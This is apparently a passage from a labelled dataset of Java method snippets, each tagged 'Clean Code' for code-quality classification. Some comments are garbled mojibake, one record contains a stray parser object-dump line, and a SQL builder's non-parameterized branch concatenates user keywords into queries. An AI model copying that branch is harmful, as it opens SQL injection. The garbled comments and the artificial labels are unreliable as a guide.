  if (CollUtil.isEmpty(ids)) {
    return;
  }
  List<SeckillConfigDO> configs=seckillConfigMapper.selectBatchIds(ids);
  if (configs.size() != ids.size()) {
    throw exception(SECKILL_CONFIG_NOT_EXISTS);
  }
  configs.forEach(config -> {
    if (ObjectUtil.equal(config.getStatus(),CommonStatusEnum.DISABLE.getStatus())) {
      throw exception(SECKILL_CONFIG_DISABLE);
    }
  }
);
}
",0,Clean Code
"/** 
 * Invalidate items after or equal to index. This will remove visible items after that and invalidate cache of layout results after that. Note that it's client's responsibility to perform removing child action,  {@link Provider#removeItem(int)} will notbe called because the index might be invalidated.
 */
public void invalidateItemsAfter(int index){
  if (index < 0) {
    return;
  }
  if (mLastVisibleIndex < 0) {
    return;
  }
  if (mLastVisibleIndex >= index) {
    mLastVisibleIndex=index - 1;
  }
  resetVisibleIndexIfEmpty();
  if (getFirstVisibleIndex() < 0) {
    setStart(index);
  }
}",0,Clean Code
"public LSS editSources(LSS sourceSet){
  return sourceSetEditor.apply(sourceSet,sourceFile -> allRecipeStack.reduce(sourceSet,recipe,ctx,(source,recipeStack) -> {
    Recipe recipe=recipeStack.peek();
    if (source == null) {
      return null;
    }
    SourceFile after=source;
    try {
      Duration duration=Duration.ofNanos(System.nanoTime() - cycleStartTime);
      if (duration.compareTo(ctx.getMessage(ExecutionContext.RUN_TIMEOUT,Duration.ofMinutes(4))) > 0) {
        if (thrownErrorOnTimeout.compareAndSet(false,true)) {
          RecipeTimeoutException t=new RecipeTimeoutException(recipe);
          ctx.getOnError().accept(t);
          ctx.getOnTimeout().accept(t,ctx);
        }
        return source;
      }
      if (ctx.getMessage(PANIC) != null) {
        return source;
      }
      TreeVisitor<?,ExecutionContext> visitor=recipe.getVisitor();
      visitor.setCursor(rootCursor);
      after=recipeRunStats.recordEdit(recipe,() -> {
        if (visitor.isAcceptable(source,ctx)) {
          return (SourceFile)visitor.visit(source,ctx,rootCursor);
        }
        return source;
      }
);
      if (after != source) {
        madeChangesInThisCycle.add(recipe);
        recordSourceFileResult(source,after,recipeStack,ctx);
        if (source.getMarkers().findFirst(Generated.class).isPresent()) {
          return source;
        }
        recipeRunStats.recordSourceFileChanged(source,after);
      }
 else       if (ctx.hasNewMessages()) {
        madeChangesInThisCycle.add(recipe);
        ctx.resetHasNewMessages();
      }
    }
 catch (    Throwable t) {
      after=handleError(recipe,source,after,t);
    }
    if (after != null && after != source) {
      after=addRecipesThatMadeChanges(recipeStack,after);
    }
    return after;
  }
,sourceFile));
}",0,Clean Code
"public void selectColor(int color){
  selectColor(color,true);
}
public void selectColor(int color,boolean updateBrush){
  List<Integer> allColors=getAllColors();
  int i=allColors.indexOf(color);
  if (i != -1) {
    if (updateBrush) {
      setCurrentBrushColorByColorIndex(i);
    }
  }
 else {
    List<Integer> from=new ArrayList<>(pendingChange.isEmpty() ? colors : pendingChange);
    pendingChange.clear();
    pendingChange.add(color);
    for (int j=0; j < from.size() - 1; j++) {
      pendingChange.add(from.get(j));
    }
    if (pendingChange.size() < DEFAULT_MODIFIABLE_COLORS.size()) {
      for (int j=pendingChange.size(); j < DEFAULT_MODIFIABLE_COLORS.size(); ++j) {
        pendingChange.add(DEFAULT_MODIFIABLE_COLORS.get(j));
      }
    }
 else     if (pendingChange.size() > DEFAULT_MODIFIABLE_COLORS.size()) {
      pendingChange=pendingChange.subList(0,DEFAULT_MODIFIABLE_COLORS.size());
    }
    if (updateBrush) {
      brushColor.put(currentBrush,color);
      needSaveBrushColor=true;
    }
  }
}",0,Clean Code
"@Override protected boolean drawChild(Canvas canvas,View child,long drawingTime){
  int width=getMeasuredWidth();
  int translationX=(int)innerTranslationX;
  final int restoreCount=canvas.save();
  canvas.clipRect(translationX,0,width,getHeight());
  final boolean result=super.drawChild(canvas,child,drawingTime);
  canvas.restoreToCount(restoreCount);
  if (translationX != 0 && child == containerView) {
    float opacity=Math.min(0.8f,(width - translationX) / (float)width);
    if (opacity < 0) {
      opacity=0;
    }
    scrimPaint.setColor((int)(((0x99000000 & 0xff000000) >>> 24) * opacity) << 24);
    canvas.drawRect(0,0,translationX,getHeight(),scrimPaint);
    final float alpha=Math.max(0,Math.min((width - translationX) / (float)AndroidUtilities.dp(20),1.0f));
    layerShadowDrawable.setBounds(translationX - layerShadowDrawable.getIntrinsicWidth(),child.getTop(),translationX,child.getBottom());
    layerShadowDrawable.setAlpha((int)(0xff * alpha));
    layerShadowDrawable.draw(canvas);
  }
  return result;
}
@Override protected boolean drawChild(Canvas canvas,View child,long drawingTime){
  if (windowView.movingPage) {
    int width=getMeasuredWidth();
    int translationX=(int)listView[0].getTranslationX();
    int clipLeft=0;
    int clipRight=width;
    if (child == listView[1]) {
      clipRight=translationX;
    }
 else     if (child == listView[0]) {
      clipLeft=translationX;
    }
    final int restoreCount=canvas.save();
    canvas.clipRect(clipLeft,0,clipRight,getHeight());
    final boolean result=super.drawChild(canvas,child,drawingTime);
    canvas.restoreToCount(restoreCount);
    if (translationX != 0) {
      if (child == listView[0]) {
        final float alpha=Math.max(0,Math.min((width - translationX) / (float)AndroidUtilities.dp(20),1.0f));
        layerShadowDrawable.setBounds(translationX - layerShadowDrawable.getIntrinsicWidth(),child.getTop(),translationX,child.getBottom());
        layerShadowDrawable.setAlpha((int)(0xff * alpha));
        layerShadowDrawable.draw(canvas);
      }
 else       if (child == listView[1]) {
        float opacity=Math.min(0.8f,(width - translationX) / (float)width);
        if (opacity < 0) {
          opacity=0;
        }
        scrimPaint.setColor((int)(((0x99000000 & 0xff000000) >>> 24) * opacity) << 24);
        canvas.drawRect(clipLeft,0,clipRight,getHeight(),scrimPaint);
      }
    }
    return result;
  }
 else {
    return super.drawChild(canvas,child,drawingTime);
  }
}
@Override protected boolean drawChild(Canvas canvas,View child,long drawingTime){
  if (child == aspectRationContainer && pinchToZoomHelper.isInOverlayModeFor(this)) {
    return true;
  }
  return super.drawChild(canvas,child,drawingTime);
}",0,Clean Code
"private void initArgumentDictionary(){
  functionsArguments.put(""Math.abs"",""(int|all) "");
  functionsArguments.put(""Math.multiply"",""(int|all) (int|all) "");
  functionsArguments.put(""Math.divide"",""(int|all) (int|all) "");
  functionsArguments.put(""Math.min"",""(int|all) (int|all) "");
  functionsArguments.put(""Math.max"",""(int|all) (int|all) "");
  functionsArguments.put(""Math.sqrt"",""(int|all) "");
  functionsArguments.put(""Array.new"",""(int|all) "");
  functionsArguments.put(""Array.dispose"","""");
  functionsArguments.put(""Memory.peek"",""(int|all) "");
  functionsArguments.put(""Memory.poke"",""(int|all) (int|all) "");
  functionsArguments.put(""Memory.alloc"",""(int|all) "");
  functionsArguments.put(""Memory.deAlloc"",""(Array|class|all) "");
  functionsArguments.put(""Screen.clearScreen"","""");
  functionsArguments.put(""Screen.setColor"",""(int|boolean|all) "");
  functionsArguments.put(""Screen.drawPixel"",""(int|all) (int|all) (int|all) (int|all) "");
  functionsArguments.put(""Screen.drawRectangle"",""(int|all) (int|all) (int|all) (int|all) "");
  functionsArguments.put(""Screen.drawLine"",""(int|all) (int|all) (int|all) (int|all) "");
  functionsArguments.put(""Screen.drawCircle"",""(int|all) (int|all) (int|all) "");
  functionsArguments.put(""Screen.clearCircle"",""(int|all) (int|all) (int|all) "");
  functionsArguments.put(""Keyboard.keyPressed"","""");
  functionsArguments.put(""Keyboard.readChar"","""");
  functionsArguments.put(""Keyboard.readLine"",""(String|null|all) "");
  functionsArguments.put(""Keyboard.readInt"",""(String|null|all) "");
  functionsArguments.put(""Output.init"","""");
  functionsArguments.put(""Output.moveCursor"",""(int|all) (int|all) "");
  functionsArguments.put(""Output.printChar"",""(int|char|all) "");
  functionsArguments.put(""Output.printString"",""(String|null|all) "");
  functionsArguments.put(""Output.printInt"",""(int|Array|char|all) "");
  functionsArguments.put(""Output.println"","""");
  functionsArguments.put(""Output.backSpace"","""");
  functionsArguments.put(""String.new"",""(int|all) "");
  functionsArguments.put(""String.dispose"","""");
  functionsArguments.put(""String.length"","""");
  functionsArguments.put(""String.charAt"",""(int|all) "");
  functionsArguments.put(""String.setCharAt"",""(int|all) (int|char|all) "");
  functionsArguments.put(""String.appendChar"",""(int|char|all) "");
  functionsArguments.put(""String.eraseLastChar"","""");
  functionsArguments.put(""String.intValue"","""");
  functionsArguments.put(""String.setInt"",""(int|all) "");
  functionsArguments.put(""String.newLine"","""");
  functionsArguments.put(""String.backSpace"","""");
  functionsArguments.put(""String.doubleQuote"","""");
  functionsArguments.put(""Sys.halt"","""");
  functionsArguments.put(""Sys.error"",""(int|all) "");
  functionsArguments.put(""Sys.wait"",""(int|all) "");
}
",0,Clean Code
"public void copyText(final boolean getSelection){
  CharSequence text=null;
  if (getSelection) {
    text=getSelectedText(InputConnection.GET_TEXT_WITH_STYLES);
  }
  if (text == null || text.length() == 0) {
    final ExtractedTextRequest etr=new ExtractedTextRequest();
    etr.flags=InputConnection.GET_TEXT_WITH_STYLES;
    etr.hintMaxChars=Integer.MAX_VALUE;
    final ExtractedText et=mIC.getExtractedText(etr,0);
    if (et == null)     return;
    text=et.text;
  }
  if (text == null || text.length() == 0)   return;
  final ClipboardManager cm=(ClipboardManager)mParent.getSystemService(Context.CLIPBOARD_SERVICE);
  cm.setPrimaryClip(ClipData.newPlainText(""copied text"",text));
}",0,Clean Code
"public static String opName(KVOperation op){
  return opName(op.op);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@127bf5f6",0,Clean Code
"/** 
 * Indicates whether this action's description is editable
 * @param editable Whether this action description is editable.
 */
public B descriptionEditable(boolean editable){
  if (!editable) {
    if (mEditable == EDITING_DESCRIPTION) {
      mEditable=EDITING_NONE;
    }
    return (B)this;
  }
  mEditable=EDITING_DESCRIPTION;
  if (isChecked() || mCheckSetId != NO_CHECK_SET) {
    throw new IllegalArgumentException(""Editable actions cannot also be checked"");
  }
  return (B)this;
}
",0,Clean Code
"/** 
 * Constructs a new source that inserts ads linearly with the content specified by  {@code contentMediaSource}. Ad media is loaded using  {@link ProgressiveMediaSource}.
 * @param contentMediaSource The {@link MediaSource} providing the content to play.
 * @param dataSourceFactory Factory for data sources used to load ad media.
 * @param adsLoader The loader for ads.
 * @param adViewProvider Provider of views for the ad UI.
 */
public AdsMediaSource(MediaSource contentMediaSource,DataSource.Factory dataSourceFactory,AdsLoader adsLoader,AdsLoader.AdViewProvider adViewProvider){
  this(contentMediaSource,new ProgressiveMediaSource.Factory(dataSourceFactory),adsLoader,adViewProvider);
}
/** 
 * Constructs a new source that inserts ads linearly with the content specified by  {@code contentMediaSource}.
 * @param contentMediaSource The {@link MediaSource} providing the content to play.
 * @param adMediaSourceFactory Factory for media sources used to load ad media.
 * @param adsLoader The loader for ads.
 * @param adViewProvider Provider of views for the ad UI.
 */
public AdsMediaSource(MediaSource contentMediaSource,MediaSourceFactory adMediaSourceFactory,AdsLoader adsLoader,AdsLoader.AdViewProvider adViewProvider){
  this.contentMediaSource=contentMediaSource;
  this.adMediaSourceFactory=adMediaSourceFactory;
  this.adsLoader=adsLoader;
  this.adViewProvider=adViewProvider;
  mainHandler=new Handler(Looper.getMainLooper());
  deferredMediaPeriodByAdMediaSource=new HashMap<>();
  period=new Timeline.Period();
  adGroupMediaSources=new MediaSource[0][];
  adGroupTimelines=new Timeline[0][];
  adsLoader.setSupportedContentTypes(adMediaSourceFactory.getSupportedTypes());
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.MeanVarianceProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.MeanVarianceProto other=(org.tribuo.protos.core.MeanVarianceProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (java.lang.Double.doubleToLongBits(getMax()) != java.lang.Double.doubleToLongBits(other.getMax()))   return false;
  if (java.lang.Double.doubleToLongBits(getMin()) != java.lang.Double.doubleToLongBits(other.getMin()))   return false;
  if (java.lang.Double.doubleToLongBits(getMean()) != java.lang.Double.doubleToLongBits(other.getMean()))   return false;
  if (java.lang.Double.doubleToLongBits(getSumSquares()) != java.lang.Double.doubleToLongBits(other.getSumSquares()))   return false;
  if (getCount() != other.getCount())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Override public boolean onKeyPreIme(int keyCode,@NonNull KeyEvent event){
  if (keyCode == KeyEvent.KEYCODE_BACK) {
    if (event.getAction() == KeyEvent.ACTION_DOWN && event.getRepeatCount() == 0) {
      KeyEvent.DispatcherState state=getKeyDispatcherState();
      if (state != null) {
        state.startTracking(event,this);
      }
      return true;
    }
 else     if (event.getAction() == KeyEvent.ACTION_UP) {
      KeyEvent.DispatcherState state=getKeyDispatcherState();
      if (state != null) {
        state.handleUpEvent(event);
      }
      if (event.isTracking() && !event.isCanceled()) {
        if (mListener != null) {
          mListener.onBackPressed();
          return true;
        }
      }
    }
  }
  return super.onKeyPreIme(keyCode,event);
}",0,Clean Code
"@ApiOperation(value=""query acrossClusterRule list"",notes=""query acrossClusterRule list"",response=Message.class) @ApiImplicitParams({@ApiImplicitParam(name=""creator"",dataType=""String"",value=""creator""),@ApiImplicitParam(name=""username"",dataType=""String"",value=""username""),@ApiImplicitParam(name=""clusterName"",dataType=""String"",value=""clusterName""),@ApiImplicitParam(name=""isValid"",dataType=""String"",value=""isValid""),@ApiImplicitParam(name=""pageNow"",dataType=""Integer"",value=""pageNow""),@ApiImplicitParam(name=""pageSize"",dataType=""Integer"",value=""pageSize"")}) @RequestMapping(path=""/list"",method=RequestMethod.GET) public Message queryAcrossClusterRuleList(HttpServletRequest req,@RequestParam(value=""creator"",required=false) String creator,@RequestParam(value=""username"",required=false) String username,@RequestParam(value=""clusterName"",required=false) String clusterName,@RequestParam(value=""isValid"",required=false) String isValid,@RequestParam(value=""pageNow"",required=false) Integer pageNow,@RequestParam(value=""pageSize"",required=false) Integer pageSize){
  String operationUser=ModuleUserUtils.getOperationUser(req,""execute query acrossClusterRule List"");
  if (!Configuration.isAdmin(operationUser)) {
    if (StringUtils.isNotBlank(username) && !operationUser.equals(username)) {
      username=""noexist"";
    }
 else {
      username=operationUser;
    }
  }
  if (StringUtils.isBlank(username))   username=null;
  if (StringUtils.isBlank(creator))   creator=null;
  if (StringUtils.isBlank(clusterName))   clusterName=null;
  if (StringUtils.isBlank(isValid))   isValid=null;
  if (null == pageNow)   pageNow=1;
  if (null == pageSize)   pageSize=20;
  Map<String,Object> resultMap=null;
  try {
    resultMap=acrossClusterRuleService.queryAcrossClusterRuleList(creator,username,clusterName,pageNow,pageSize,isValid);
  }
 catch (  Exception e) {
    log.info(""query acrossClusterRule List failed: "",e);
    return Message.error(""query acrossClusterRule List failed"");
  }
  Message msg=Message.ok();
  msg.getData().putAll(resultMap);
  return msg;
}",0,Clean Code
"/** 
 * 设置颜色渐变类型
 * @param gradientOrientation gradientOrientation
 * @return Orientation
 */
private GradientDrawable.Orientation getOrientation(int gradientOrientation){
  GradientDrawable.Orientation orientation=null;
switch (gradientOrientation) {
case TOP_BOTTOM:
    orientation=GradientDrawable.Orientation.TOP_BOTTOM;
  break;
case TR_BL:
orientation=GradientDrawable.Orientation.TR_BL;
break;
case RIGHT_LEFT:
orientation=GradientDrawable.Orientation.RIGHT_LEFT;
break;
case BR_TL:
orientation=GradientDrawable.Orientation.BR_TL;
break;
case BOTTOM_TOP:
orientation=GradientDrawable.Orientation.BOTTOM_TOP;
break;
case BL_TR:
orientation=GradientDrawable.Orientation.BL_TR;
break;
case LEFT_RIGHT:
orientation=GradientDrawable.Orientation.LEFT_RIGHT;
break;
case TL_BR:
orientation=GradientDrawable.Orientation.TL_BR;
break;
}
return orientation;
}
",0,Clean Code
"/** 
 * 鏌ヨ鎵�鏈夊瓧娈�
 * @return data
 */
@Override public List<CrmModelFiledVO> queryDefaultField(){
  List<CrmModelFiledVO> filedList=crmFieldService.queryField(getLabel().getType());
  filedList.add(new CrmModelFiledVO(""typeId"",FieldEnum.SELECT,1));
  filedList.add(new CrmModelFiledVO(""statusId"",FieldEnum.SELECT,1));
  filedList.add(new CrmModelFiledVO(""lastTime"",FieldEnum.DATETIME,1));
  filedList.add(new CrmModelFiledVO(""updateTime"",FieldEnum.DATETIME,1));
  filedList.add(new CrmModelFiledVO(""receiveTime"",FieldEnum.DATETIME,1));
  filedList.add(new CrmModelFiledVO(""nextTime"",FieldEnum.DATETIME,1));
  filedList.add(new CrmModelFiledVO(""createTime"",FieldEnum.DATETIME,1));
  filedList.add(new CrmModelFiledVO(""ownerUserId"",FieldEnum.USER,1));
  filedList.add(new CrmModelFiledVO(""createUserId"",FieldEnum.USER,1));
  filedList.add(new CrmModelFiledVO(""status"",FieldEnum.TEXT,1));
  filedList.add(new CrmModelFiledVO(""teamMemberIds"",FieldEnum.USER,0));
  return filedList;
}",0,Clean Code
"public static Object hookBridge(int slot,Object thiz,Object[] params) throws Throwable {
  HookInfo hookInfo=hookInfos[slot];
  if (XposedBridge.disableHooks) {
    return SandHook.callOriginMethod(hookInfo.origin,hookInfo.backup,thiz,params);
  }
  Object[] snapshot=hookInfo.additionalHookInfo.callbacks.getSnapshot();
  if (snapshot == null || snapshot.length == 0) {
    return SandHook.callOriginMethod(hookInfo.origin,hookInfo.backup,thiz,params);
  }
  XC_MethodHook.MethodHookParam param=new XC_MethodHook.MethodHookParam();
  param.method=hookInfo.origin;
  param.thisObject=thiz;
  param.args=params;
  int beforeIdx=0;
  do {
    try {
      ((XC_MethodHook)snapshot[beforeIdx]).callBeforeHookedMethod(param);
    }
 catch (    Throwable t) {
      param.setResult(null);
      param.returnEarly=false;
      continue;
    }
    if (param.returnEarly) {
      beforeIdx++;
      break;
    }
  }
 while (++beforeIdx < snapshot.length);
  if (!param.returnEarly) {
    try {
      param.setResult(SandHook.callOriginMethod(hookInfo.origin,hookInfo.backup,thiz,param.args));
    }
 catch (    Throwable e) {
      XposedBridge.log(e);
      param.setThrowable(e);
    }
  }
  int afterIdx=beforeIdx - 1;
  do {
    Object lastResult=param.getResult();
    Throwable lastThrowable=param.getThrowable();
    try {
      ((XC_MethodHook)snapshot[afterIdx]).callAfterHookedMethod(param);
    }
 catch (    Throwable t) {
      XposedBridge.log(t);
      if (lastThrowable == null)       param.setResult(lastResult);
 else       param.setThrowable(lastThrowable);
    }
  }
 while (--afterIdx >= 0);
  if (!param.hasThrowable()) {
    return param.getResult();
  }
 else {
    throw param.getThrowable();
  }
}",0,Clean Code
"@Override public OpenTelemetrySdk create(OpenTelemetryConfigurationModel model,SpiHelper spiHelper,List<Closeable> closeables){
  OpenTelemetrySdkBuilder builder=OpenTelemetrySdk.builder();
  if (!""0.3"".equals(model.getFileFormat())) {
    throw new ConfigurationException(""Unsupported file format. Supported formats include: 0.3"");
  }
  if (Objects.equals(Boolean.TRUE,model.getDisabled())) {
    return builder.build();
  }
  if (model.getPropagator() != null) {
    builder.setPropagators(PropagatorFactory.getInstance().create(model.getPropagator(),spiHelper,closeables));
  }
  Resource resource=Resource.getDefault();
  if (model.getResource() != null) {
    resource=ResourceFactory.getInstance().create(model.getResource(),spiHelper,closeables);
  }
  if (model.getLoggerProvider() != null) {
    builder.setLoggerProvider(FileConfigUtil.addAndReturn(closeables,LoggerProviderFactory.getInstance().create(LoggerProviderAndAttributeLimits.create(model.getAttributeLimits(),model.getLoggerProvider()),spiHelper,closeables).setResource(resource).build()));
  }
  if (model.getTracerProvider() != null) {
    builder.setTracerProvider(FileConfigUtil.addAndReturn(closeables,TracerProviderFactory.getInstance().create(TracerProviderAndAttributeLimits.create(model.getAttributeLimits(),model.getTracerProvider()),spiHelper,closeables).setResource(resource).build()));
  }
  if (model.getMeterProvider() != null) {
    builder.setMeterProvider(FileConfigUtil.addAndReturn(closeables,MeterProviderFactory.getInstance().create(model.getMeterProvider(),spiHelper,closeables).setResource(resource).build()));
  }
  return FileConfigUtil.addAndReturn(closeables,builder.build());
}",0,Clean Code
"private static VoxelShape getCasingShape(BlockState state){
  if (!state.getValue(BeltBlock.CASING))   return Shapes.empty();
  Direction facing=state.getValue(BeltBlock.HORIZONTAL_FACING);
  BeltPart part=state.getValue(BeltBlock.PART);
  BeltSlope slope=state.getValue(BeltBlock.SLOPE);
  if (slope == BeltSlope.VERTICAL)   return Shapes.empty();
  if (slope == BeltSlope.SIDEWAYS)   return Shapes.empty();
  if (slope == BeltSlope.HORIZONTAL) {
    return AllShapes.CASING_11PX.get(Direction.UP);
  }
  if (part == BeltPart.MIDDLE || part == BeltPart.PULLEY)   return PARTIAL_CASING.get(slope == BeltSlope.UPWARD ? facing : facing.getOpposite());
  if (part == BeltPart.START)   return slope == BeltSlope.UPWARD ? AllShapes.CASING_11PX.get(Direction.UP) : PARTIAL_CASING.get(facing.getOpposite());
  if (part == BeltPart.END)   return slope == BeltSlope.DOWNWARD ? AllShapes.CASING_11PX.get(Direction.UP) : PARTIAL_CASING.get(facing);
  return Shapes.block();
}",0,Clean Code
"void startParallax(){
  if (mParallaxEffect != null) {
    return;
  }
  Parallax.IntProperty frameTop=mDetailsParallax.getOverviewRowTop();
  final float maxFrameTop=1f;
  final float minFrameTop=0f;
  mParallaxEffect=mDetailsParallax.addEffect(frameTop.atFraction(maxFrameTop),frameTop.atFraction(minFrameTop)).target(new ParallaxTarget(){
    @Override public void update(    float fraction){
      if (fraction == maxFrameTop) {
        updateState(NO_VIDEO);
      }
 else {
        updateState(PLAY_VIDEO);
      }
    }
  }
);
  mDetailsParallax.updateValues();
}",0,Clean Code
"@Override public DatabendConstant getExpectedValue(){
  DatabendConstant leftValue=leftExpr.getExpectedValue();
  if (leftValue == null) {
    return null;
  }
  if (leftValue.isNull()) {
    return DatabendConstant.createNullConstant();
  }
  boolean isNull=false;
  for (  DatabendExpression expr : rightExpr) {
    DatabendConstant rightValue=expr.getExpectedValue();
    if (rightValue == null) {
      return null;
    }
    if (rightValue.isNull()) {
      isNull=true;
    }
 else     if (rightValue.isEquals(leftValue).isBoolean() && rightValue.isEquals(leftValue).asBoolean()) {
      return DatabendConstant.createBooleanConstant(!isNegated());
    }
  }
  if (isNull) {
    return DatabendConstant.createNullConstant();
  }
 else {
    return DatabendConstant.createBooleanConstant(isNegated());
  }
}
",0,Clean Code
"public static String replaceCalcFieldPlaceHolder(String s,SQLMeta sqlMeta){
  Map<String,String> fieldsDialect=new HashMap<>();
  if (MapUtils.isNotEmpty(sqlMeta.getXFieldsDialect())) {
    fieldsDialect.putAll(sqlMeta.getXFieldsDialect());
  }
  if (MapUtils.isNotEmpty(sqlMeta.getYFieldsDialect())) {
    fieldsDialect.putAll(sqlMeta.getYFieldsDialect());
  }
  if (MapUtils.isNotEmpty(sqlMeta.getCustomWheresDialect())) {
    fieldsDialect.putAll(sqlMeta.getCustomWheresDialect());
  }
  if (MapUtils.isNotEmpty(sqlMeta.getExtWheresDialect())) {
    fieldsDialect.putAll(sqlMeta.getExtWheresDialect());
  }
  if (MapUtils.isNotEmpty(sqlMeta.getWhereTreesDialect())) {
    fieldsDialect.putAll(sqlMeta.getWhereTreesDialect());
  }
  if (MapUtils.isNotEmpty(fieldsDialect)) {
    for (    Map.Entry<String,String> ele : fieldsDialect.entrySet()) {
      s=s.replaceAll(SqlPlaceholderConstants.KEYWORD_PREFIX_REGEX + ele.getKey() + SqlPlaceholderConstants.KEYWORD_SUFFIX_REGEX,Matcher.quoteReplacement(ele.getValue()));
    }
  }
  return s;
}
",0,Clean Code
"@Override protected WebvttSubtitle decode(byte[] bytes,int length,boolean reset) throws SubtitleDecoderException {
  parsableWebvttData.reset(bytes,length);
  webvttCueBuilder.reset();
  definedStyles.clear();
  try {
    WebvttParserUtil.validateWebvttHeaderLine(parsableWebvttData);
  }
 catch (  ParserException e) {
    throw new SubtitleDecoderException(e);
  }
  while (!TextUtils.isEmpty(parsableWebvttData.readLine())) {
  }
  int event;
  ArrayList<WebvttCue> subtitles=new ArrayList<>();
  while ((event=getNextEvent(parsableWebvttData)) != EVENT_END_OF_FILE) {
    if (event == EVENT_COMMENT) {
      skipComment(parsableWebvttData);
    }
 else     if (event == EVENT_STYLE_BLOCK) {
      if (!subtitles.isEmpty()) {
        throw new SubtitleDecoderException(""A style block was found after the first cue."");
      }
      parsableWebvttData.readLine();
      definedStyles.addAll(cssParser.parseBlock(parsableWebvttData));
    }
 else     if (event == EVENT_CUE) {
      if (cueParser.parseCue(parsableWebvttData,webvttCueBuilder,definedStyles)) {
        subtitles.add(webvttCueBuilder.build());
        webvttCueBuilder.reset();
      }
    }
  }
  return new WebvttSubtitle(subtitles);
}
",0,Clean Code
"public String getGroupFieldsJSONString(){
  if (groupFields == null) {
    return null;
  }
  List<InterfaceGroupFieldReq> groupFieldList=Arrays.asList((InterfaceGroupFieldReq[])groupFields);
  List<JSONObject> results=groupFieldList.stream().map(groupField -> {
    JSONObject result=new JSONObject();
    result.put(""field"",groupField.getField());
    result.put(""alias"",groupField.getAlias());
    result.put(""dim"",groupField.getDim());
    result.put(""type"",groupField.getType());
    result.put(""operator"",groupField.getOperator());
    result.put(""granularity"",groupField.getGranularity());
    return result;
  }
).collect(Collectors.toList());
  return JSONObject.toJSONString(results);
}
",0,Clean Code
"/** 
 * Parses the tag value and determines if it's a group by, a literal or a filter.
 * @param tagk   The tag key associated with this value
 * @param filter The tag value, possibly a filter
 * @return Null if the value was a group by or a literal, a valid filter objectif it looked to be a filter.
 * @throws IllegalArgumentException if the tag key or filter was null, emptyor if the filter was malformed, e.g. a bad regular expression.
 */
public static TagVFilter getFilter(final String tagk,final String filter){
  if (tagk == null || tagk.isEmpty()) {
    throw new IllegalArgumentException(""Tagk cannot be null or empty"");
  }
  if (filter == null || filter.isEmpty()) {
    throw new IllegalArgumentException(""Filter cannot be null or empty"");
  }
  if (filter.length() == 1 && filter.charAt(0) == '*') {
    return null;
  }
  final int paren=filter.indexOf('(');
  if (paren > -1) {
    final String prefix=filter.substring(0,paren).toLowerCase();
    return new TagVFilter.Builder().setTagk(tagk).setFilter(stripParentheses(filter)).setType(prefix).build();
  }
 else   if (filter.contains(""*"")) {
    return new TagVWildcardFilter(tagk,filter,true);
  }
 else {
    return null;
  }
}
public String getFilter(){
  return filter;
}",0,Clean Code
"/** 
 * 鏌ヨ瀹℃壒鐢ㄦ埛锛屼笉浼氬瓨鍦ㄦ潯浠跺鎵圭殑鎯呭喌
 * @param createUserId 鍒涘缓浜�
 * @param recordId     瀹℃牳璁板綍ID
 * @param examineFlow  褰撳墠瀹℃壒娴佺▼
 * @return data
 */
public ExamineUserBO queryFlowUser(Long createUserId,Integer recordId,ExamineFlow examineFlow){
  List<ExamineFlowMember> flowMembers=lambdaQuery().eq(ExamineFlowMember::getFlowId,examineFlow.getFlowId()).orderByAsc(ExamineFlowMember::getSort).list();
  ExamineUserBO examineUserBO=new ExamineUserBO();
  examineUserBO.setType(flowMembers.get(0).getType());
  List<Long> userIds=flowMembers.stream().map(ExamineFlowMember::getUserId).collect(Collectors.toList());
  examineUserBO.setUserList(handleUserList(userIds,examineFlow.getExamineId()));
  return examineUserBO;
}",0,Clean Code
"StateAdapter(final FragmentActivity fa){
  super(fa);
}
StateAdapter(final FragmentActivity fa){
  super(fa);
}
StateAdapter(final FragmentActivity fa){
  super(fa);
}
StateAdapter(final FragmentActivity fa){
  super(fa);
  mCacheDir=fa.getCacheDir().getAbsolutePath();
}
StateAdapter(final FragmentActivity fa){
  super(fa);
}
",0,Clean Code
"@Override public Sql toKeywordQueryCondition(Table table,Query query,boolean parameterized){
  Sql sql=Sql.valueOf();
  if (!query.hasKeyword())   return sql;
  String joinOpt=(query.isNotLike() ? "" AND "" : "" OR "");
  String likeOpt=(query.isNotLike() ? "" NOT LIKE "" : "" LIKE "");
  String equalOpt=(query.isNotLike() ? "" != "" : "" = "");
  Column[] columns=table.getColumns();
  for (int i=0; i < columns.length; i++) {
    if (i >= this.keywordQueryColumnCount)     break;
    Column column=columns[i];
    SearchableType searchableType=column.getSearchableType();
    String myOperator=null;
    Object myKeyword=null;
    if (SearchableType.NO.equals(searchableType))     ;
 else     if (SearchableType.ONLY_LIKE.equals(searchableType) || SearchableType.ALL.equals(searchableType)) {
      myOperator=likeOpt;
      myKeyword=wrapLikeKeyword(query.getKeyword());
    }
 else {
      Number number=parseToNumber(query.getKeyword(),column.getType());
      if (number != null) {
        myOperator=equalOpt;
        myKeyword=number;
      }
    }
    if (myOperator != null && myKeyword != null) {
      if (!sql.isEmpty())       sql.sql(joinOpt);
      if (parameterized)       sql.sql(quote(column.getName()) + myOperator + ""?"",createSqlParamValue(column,myKeyword));
 else       sql.sql(quote(column.getName()) + myOperator + (myKeyword instanceof Number ? query.getKeyword() : ""'"" + myKeyword + ""'""));
    }
  }
  return sql;
}",0,Clean Code
"@Override public void onSuccess(List<V2TIMFriendInfoResult> v2TIMFriendInfoResults){
  if (v2TIMFriendInfoResults == null || v2TIMFriendInfoResults.isEmpty()) {
    TUILog.e(TAG,""getUserInfo result is empty"");
    if (null != callback) {
      callback.onFailed(-1,ERROR_MSG_EMPTY_LIST);
    }
    return;
  }
  List<CallingUserModel> list=new ArrayList<>();
  for (  V2TIMFriendInfoResult result : v2TIMFriendInfoResults) {
    if (result == null) {
      continue;
    }
    CallingUserModel model=new CallingUserModel();
    V2TIMFriendInfo friendInfo=result.getFriendInfo();
    model.userId=friendInfo.getUserID();
    model.userName=friendInfo.getFriendRemark();
    if (TextUtils.isEmpty(model.userName)) {
      String nickName=friendInfo.getUserProfile().getNickName();
      model.userName=TextUtils.isEmpty(nickName) ? friendInfo.getUserID() : nickName;
    }
    model.userAvatar=friendInfo.getUserProfile().getFaceUrl();
    if (!isUrl(model.userAvatar)) {
      model.userAvatar="""";
    }
    list.add(model);
  }
